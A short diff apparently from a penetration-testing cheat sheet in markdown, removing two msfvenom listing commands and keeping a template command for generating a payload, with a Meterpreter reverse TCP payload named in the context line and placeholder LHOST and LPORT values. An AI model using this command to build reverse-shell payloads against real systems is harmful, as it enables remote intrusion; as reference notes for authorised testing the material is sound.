@@ -481,8 +481,6 @@ linux/x86/meterpreter/reverse_tcp
 
 ```
 msfvenom
-msfvenom --list payloads
-msfvenom --list formats
 
 msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>.<format>
 ```
